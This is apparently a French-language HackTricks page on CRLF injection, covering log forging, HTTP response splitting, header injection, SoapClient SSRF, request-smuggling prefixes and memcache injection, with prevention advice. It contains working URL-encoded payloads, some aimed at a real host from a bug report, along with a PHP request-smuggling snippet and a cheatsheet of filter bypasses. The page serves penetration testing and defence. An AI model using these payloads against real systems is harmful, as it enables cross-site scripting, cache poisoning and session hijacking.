# CRLF (%0D%0A) Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **inscrivez-vous** sur **Intigriti**, une **plateforme de bug bounty premium cr√©√©e par des hackers, pour des hackers** ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) aujourd'hui, et commencez √† gagner des primes allant jusqu'√† **100 000 $** !

{% embed url="https://go.intigriti.com/hacktricks" %}

### CRLF

Le retour chariot (CR) et le saut de ligne (LF), collectivement connus sous le nom de CRLF, sont des s√©quences de caract√®res sp√©ciaux utilis√©es dans le protocole HTTP pour indiquer la fin d'une ligne ou le d√©but d'une nouvelle. Les serveurs web et les navigateurs utilisent CRLF pour distinguer les en-t√™tes HTTP du corps d'une r√©ponse. Ces caract√®res sont universellement employ√©s dans les communications HTTP/1.1 √† travers divers types de serveurs web, tels qu'Apache et Microsoft IIS.

### Vuln√©rabilit√© d'Injection CRLF

L'injection CRLF implique l'insertion de caract√®res CR et LF dans des entr√©es fournies par l'utilisateur. Cette action induit en erreur le serveur, l'application ou l'utilisateur en interpr√©tant la s√©quence inject√©e comme la fin d'une r√©ponse et le d√©but d'une autre. Bien que ces caract√®res ne soient pas intrins√®quement nuisibles, leur mauvaise utilisation peut conduire √† un fractionnement de r√©ponse HTTP et √† d'autres activit√©s malveillantes.

### Exemple : Injection CRLF dans un Fichier Journal

[Exemple ici](https://www.invicti.com/blog/web-security/crlf-http-header/)

Consid√©rez un fichier journal dans un panneau d'administration qui suit le format : `IP - Heure - Chemin Visit√©`. Une entr√©e typique pourrait ressembler √† :
```
123.123.123.123 - 08:15 - /index.php?page=home
```
Un attaquant peut exploiter une injection CRLF pour manipuler ce journal. En injectant des caract√®res CRLF dans la requ√™te HTTP, l'attaquant peut modifier le flux de sortie et fabriquer des entr√©es de journal. Par exemple, une s√©quence inject√©e pourrait transformer l'entr√©e du journal en :
```
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Ici, `%0d` et `%0a` repr√©sentent les formes encod√©es en URL de CR et LF. Apr√®s l'attaque, le journal afficherait de mani√®re trompeuse :
```
IP - Time - Visited Path

123.123.123.123 - 08:15 - /index.php?page=home&
127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
L'attaquant dissimule ainsi ses activit√©s malveillantes en faisant appara√Ætre que le localhost (une entit√© g√©n√©ralement de confiance dans l'environnement serveur) a effectu√© les actions. Le serveur interpr√®te la partie de la requ√™te commen√ßant par `%0d%0a` comme un seul param√®tre, tandis que le param√®tre `restrictedaction` est analys√© comme une autre entr√©e distincte. La requ√™te manipul√©e imite efficacement une commande administrative l√©gitime : `/index.php?page=home&restrictedaction=edit`

### HTTP Response Splitting

#### Description

HTTP Response Splitting est une vuln√©rabilit√© de s√©curit√© qui survient lorsqu'un attaquant exploite la structure des r√©ponses HTTP. Cette structure s√©pare les en-t√™tes du corps √† l'aide d'une s√©quence de caract√®res sp√©cifique, le Retour Chariot (CR) suivi du Saut de Ligne (LF), collectivement appel√©s CRLF. Si un attaquant parvient √† ins√©rer une s√©quence CRLF dans un en-t√™te de r√©ponse, il peut efficacement manipuler le contenu de la r√©ponse suivante. Ce type de manipulation peut entra√Æner de graves probl√®mes de s√©curit√©, notamment le Cross-site Scripting (XSS).

#### XSS √† travers HTTP Response Splitting

1. L'application d√©finit un en-t√™te personnalis√© comme ceci : `X-Custom-Header: UserInput`
2. L'application r√©cup√®re la valeur pour `UserInput` √† partir d'un param√®tre de requ√™te, disons "user\_input". Dans des sc√©narios manquant de validation et d'encodage appropri√©s des entr√©es, un attaquant peut cr√©er un payload qui inclut la s√©quence CRLF, suivie de contenu malveillant.
3. Un attaquant cr√©e une URL avec un 'user\_input' sp√©cialement con√ßu : `?user_input=Value%0d%0a%0d%0a<script>alert('XSS')</script>`
* Dans cette URL, `%0d%0a%0d%0a` est la forme encod√©e en URL de CRLFCRLF. Cela trompe le serveur en ins√©rant une s√©quence CRLF, faisant en sorte que le serveur traite la partie suivante comme le corps de la r√©ponse.
4. Le serveur refl√®te l'entr√©e de l'attaquant dans l'en-t√™te de r√©ponse, entra√Ænant une structure de r√©ponse non intentionnelle o√π le script malveillant est interpr√©t√© par le navigateur comme faisant partie du corps de la r√©ponse.

#### Un exemple de HTTP Response Splitting menant √† une redirection

De [https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62](https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62)

Navigateur vers :
```
/%0d%0aLocation:%20http://myweb.com
```
Et le serveur r√©pond avec l'en-t√™te :
```
Location: http://myweb.com
```
**Autre exemple : (de** [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)**)**
```
http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```
#### Dans le chemin URL

Vous pouvez envoyer la charge utile **√† l'int√©rieur du chemin URL** pour contr√¥ler la **r√©ponse** du serveur (exemple de [ici](https://hackerone.com/reports/192667)):
```
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```
Check more examples in:

{% embed url="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md" %}

### Injection d'en-t√™te HTTP

L'injection d'en-t√™te HTTP, souvent exploit√©e par l'injection CRLF (Carriage Return and Line Feed), permet aux attaquants d'ins√©rer des en-t√™tes HTTP. Cela peut compromettre des m√©canismes de s√©curit√© tels que les filtres XSS (Cross-Site Scripting) ou la SOP (Same-Origin Policy), menant potentiellement √† un acc√®s non autoris√© √† des donn√©es sensibles, telles que des jetons CSRF, ou √† la manipulation de sessions utilisateur par le biais de l'injection de cookies.

#### Exploitation de CORS via l'injection d'en-t√™te HTTP

Un attaquant peut injecter des en-t√™tes HTTP pour activer CORS (Cross-Origin Resource Sharing), contournant les restrictions impos√©es par la SOP. Cette violation permet √† des scripts provenant d'origines malveillantes d'interagir avec des ressources d'une origine diff√©rente, acc√©dant potentiellement √† des donn√©es prot√©g√©es.

#### SSRF et injection de requ√™te HTTP via CRLF

L'injection CRLF peut √™tre utilis√©e pour cr√©er et injecter une toute nouvelle requ√™te HTTP. Un exemple notable de cela est la vuln√©rabilit√© dans la classe `SoapClient` de PHP, sp√©cifiquement dans le param√®tre `user_agent`. En manipulant ce param√®tre, un attaquant peut ins√©rer des en-t√™tes suppl√©mentaires et du contenu dans le corps, ou m√™me injecter enti√®rement une nouvelle requ√™te HTTP. Ci-dessous un exemple PHP d√©montrant cette exploitation :
```php
$target = 'http://127.0.0.1:9090/test';
$post_string = 'variable=post value';
$crlf = array(
'POST /proxy HTTP/1.1',
'Host: local.host.htb',
'Cookie: PHPSESSID=[PHPSESSID]',
'Content-Type: application/x-www-form-urlencoded',
'Content-Length: '.(string)strlen($post_string),
"\r\n",
$post_string
);

$client = new SoapClient(null,
array(
'uri'=>$target,
'location'=>$target,
'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
)
);

# Put a netcat listener on port 9090
$client->__soapCall("test", []);
```
### Injection d'en-t√™te pour le Request Smuggling

Pour plus d'informations sur cette technique et les probl√®mes potentiels [**consultez la source originale**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning).

Vous pouvez injecter des en-t√™tes essentiels pour garantir que le **back-end maintienne la connexion ouverte** apr√®s avoir r√©pondu √† la demande initiale :
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```
Apr√®s cela, une deuxi√®me requ√™te peut √™tre sp√©cifi√©e. Ce sc√©nario implique g√©n√©ralement [HTTP request smuggling](http-request-smuggling/), une technique o√π des en-t√™tes suppl√©mentaires ou des √©l√©ments de corps ajout√©s par le serveur apr√®s l'injection peuvent conduire √† diverses exploitations de s√©curit√©.

**Exploitation :**

1. **Injection de Pr√©fixe Malveillant** : Cette m√©thode consiste √† empoisonner la requ√™te du prochain utilisateur ou un cache web en sp√©cifiant un pr√©fixe malveillant. Un exemple de cela est :

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1`

2. **Cr√©ation d'un Pr√©fixe pour l'Empoisonnement de la File d'Attente de R√©ponse** : Cette approche consiste √† cr√©er un pr√©fixe qui, lorsqu'il est combin√© avec des d√©chets en fin de ligne, forme une seconde requ√™te compl√®te. Cela peut d√©clencher l'empoisonnement de la file d'attente de r√©ponse. Un exemple est :

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`

### Injection Memcache

Memcache est un **stockage cl√©-valeur qui utilise un protocole en texte clair**. Plus d'infos dans :

{% content-ref url="../network-services-pentesting/11211-memcache/" %}
[11211-memcache](../network-services-pentesting/11211-memcache/)
{% endcontent-ref %}

**Pour l'information compl√®te, lisez le**[ **rapport original**](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/)

Si une plateforme prend **des donn√©es d'une requ√™te HTTP et les utilise sans les assainir** pour effectuer des **requ√™tes** vers un serveur **memcache**, un attaquant pourrait abuser de ce comportement pour **injecter de nouvelles commandes memcache**.

Par exemple, dans la vuln√©rabilit√© d√©couverte √† l'origine, des cl√©s de cache √©taient utilis√©es pour retourner l'IP et le port auxquels un utilisateur devait se connecter, et les attaquants pouvaient **injecter des commandes memcache** qui **empoisonnaient** le **cache pour envoyer les d√©tails des victimes** (noms d'utilisateur et mots de passe inclus) aux serveurs de l'attaquant :

<figure><img src="../.gitbook/assets/image (659).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/ba72cd16-2ca0-447b-aa70-5cde302a0b88/body-578d9f9f-1977-4e34-841c-ad870492328f_10.png?w=1322&#x26;h=178&#x26;auto=format&#x26;fit=crop"><figcaption></figcaption></figure>

De plus, les chercheurs ont √©galement d√©couvert qu'ils pouvaient d√©synchroniser les r√©ponses memcache pour envoyer l'IP et les ports des attaquants √† des utilisateurs dont l'attaquant ne connaissait pas l'email :

<figure><img src="../.gitbook/assets/image (637).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/c6c1f3c4-d244-4bd9-93f7-2c88f139acfa/body-3f9ceeb9-3d6b-4867-a23f-e0e50a46a2e9_14.png?w=1322&#x26;h=506&#x26;auto=format&#x26;fit=crop"><figcaption></figcaption></figure>

### Comment Pr√©venir les Injections CRLF / HTTP Header dans les Applications Web

Pour att√©nuer les risques d'injections CRLF (Carriage Return et Line Feed) ou d'injections d'en-t√™tes HTTP dans les applications web, les strat√©gies suivantes sont recommand√©es :

1. **√âviter l'Entr√©e Directe de l'Utilisateur dans les En-t√™tes de R√©ponse :** L'approche la plus s√ªre est de s'abstenir d'incorporer directement les entr√©es fournies par l'utilisateur dans les en-t√™tes de r√©ponse.
2. **Encoder les Caract√®res Sp√©ciaux :** Si √©viter l'entr√©e directe de l'utilisateur n'est pas faisable, assurez-vous d'utiliser une fonction d√©di√©e √† l'encodage des caract√®res sp√©ciaux comme CR (Carriage Return) et LF (Line Feed). Cette pratique emp√™che la possibilit√© d'injection CRLF.
3. **Mettre √† Jour le Langage de Programmation :** Mettez r√©guli√®rement √† jour le langage de programmation utilis√© dans vos applications web vers la derni√®re version. Optez pour une version qui interdit intrins√®quement l'injection de caract√®res CR et LF dans les fonctions charg√©es de d√©finir les en-t√™tes HTTP.

### CHEATSHEET

[Cheatsheet from here](https://twitter.com/NinadMishra5/status/1650080604174667777)
```
1. HTTP Response Splitting
‚Ä¢ /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
‚Ä¢ //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
‚Ä¢ /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
‚Ä¢ /google.com/%2F..%0D%0AHeader-Test:test2
‚Ä¢ /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
‚Ä¢ /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
‚Ä¢ /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
‚Ä¢ %E5%98%8A = %0A = \u560a
‚Ä¢ %E5%98%8D = %0D = \u560d
‚Ä¢ %E5%98%BE = %3E = \u563e (>)
‚Ä¢ %E5%98%BC = %3C = \u563c (<)
‚Ä¢ Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```
## Outils Automatiques

* [https://github.com/Raghavd3v/CRLFsuite](https://github.com/Raghavd3v/CRLFsuite)
* [https://github.com/dwisiswant0/crlfuzz](https://github.com/dwisiswant0/crlfuzz)

## Liste de D√©tection de Brute-Force

* [https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt](https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt)

## R√©f√©rences

* [**https://www.invicti.com/blog/web-security/crlf-http-header/**](https://www.invicti.com/blog/web-security/crlf-http-header/)
* [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)
* [**https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)
* [**https://www.netsparker.com/blog/web-security/crlf-http-header/**](https://www.netsparker.com/blog/web-security/crlf-http-header/)

<figure><img src="../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Conseil de bug bounty** : **inscrivez-vous** sur **Intigriti**, une **plateforme de bug bounty premium cr√©√©e par des hackers, pour des hackers** ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) aujourd'hui, et commencez √† gagner des r√©compenses allant jusqu'√† **100 000 $** !

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
Apprenez & pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez & pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
